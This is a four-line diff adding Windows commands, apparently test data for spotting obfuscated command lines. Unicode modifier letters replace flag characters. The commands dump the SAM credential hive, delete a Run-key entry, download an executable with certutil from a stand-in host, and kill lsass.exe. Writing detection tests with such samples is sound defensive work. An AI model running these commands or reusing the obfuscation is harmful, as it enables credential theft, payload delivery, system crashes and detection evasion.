@@ -1,0 +1,4 @@
+reg ˢave hklm\sam 1.hiv
+reg delete hklm\software\microsoft\windows\currentversion\run /ᶠ /v test
+certutil -ᵁrlcache -ˢplit -ᶠ http://www.test.com/xxx.exe
+taskkill /ᶠ /im lsass.exe
